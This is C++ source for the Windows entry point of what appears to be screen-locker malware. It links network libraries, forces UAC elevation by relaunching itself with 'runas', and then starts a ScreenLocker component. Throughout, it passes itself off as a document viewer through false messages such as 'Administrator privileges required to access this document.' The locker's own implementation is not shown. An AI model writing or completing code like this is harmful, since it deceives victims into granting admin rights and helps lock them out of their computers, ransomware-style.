#include <windows.h>
#include <iostream>
#include "ScreenLocker.h"

// Link necessary libraries
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib") 
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

// Function to check if running as administrator
bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        if (!CheckTokenMembership(NULL, adminGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(adminGroup);
    }
    
    return isAdmin == TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Force UAC elevation if not running as admin
    if (!IsRunningAsAdmin()) {
        // Get current executable path
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        
        // Re-launch with admin privileges using ShellExecute
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"runas";
        sei.lpFile = exePath;
        sei.lpParameters = NULL;
        sei.nShow = nCmdShow;
        sei.fMask = SEE_MASK_FLAG_NO_UI;
        
        if (ShellExecuteExW(&sei)) {
            return 0; // Exit current instance, admin instance will run
        } else {
            MessageBox(NULL, L"Administrator privileges required to access this document.", 
                       L"Access Denied", MB_OK | MB_ICONWARNING);
            return -1;
        }
    }

    ScreenLocker locker(hInstance);

    if (!locker.Initialize()) {
        MessageBox(NULL, L"Failed to initialize document viewer", L"Error", MB_OK);
        return -1;
    }

    return locker.Run();
}